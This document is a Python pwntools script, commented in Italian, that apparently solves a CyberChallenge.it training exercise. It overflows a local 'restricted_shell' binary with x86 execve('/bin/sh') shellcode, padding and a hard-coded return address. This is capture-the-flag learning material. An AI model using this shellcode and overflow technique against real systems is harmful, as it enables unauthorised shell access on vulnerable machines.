#!/usr/bin/env python3

# Importa la libreria di pwntools
from pwn import *


def main():
    '''
    remote(hostname, port) apre una socket e ritorna un object
    che può essere usato per inviare e ricevere dati sulla socket  
    '''
    HOST = "shell.challs.cyberchallenge.it"
    PORT = 9123
    #r = remote(HOST, PORT)
    exe = ELF("./restricted_shell")
    r = process(exe.path)


    # .send() può essere invocato sull'oggetto ritornato da remote() per inviare dati
    #r.send(b"Ciao!")

    # .sendline() è identico a .send(), però appende un newline dopo i dati
    #r.sendline(b"Ciao!")

    # .sendafter() e .sendlineafter() inviano la stringa "Ciao!"
    #r.sendafter(b"... Invia un qualsiasi carattere per iniziare ...", b"k")


    # .recvuntil() legge dalla socket finchè non viene incontrata la stringa "something"

    input_address = p32(0xffffd8a0, endianness='little')
    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
    string = "a" * 16
    string_bytes = str.encode(string)
    payload =  shellcode + string_bytes + p32(0xffffd8a0, endianness='little')
    print(type(payload))
    print(payload)
    r.sendlineafter(b"restricted-shell c:\ > ", payload)

    data = r.recv(1024)
    print(data)

    data = r.recv(1024)
    print(data)

    # permette di interagire con la connessione direttamente dalla shell
    #r.interactive()

    # chiude la socket
    r.close()


if __name__ == "__main__":
    main()
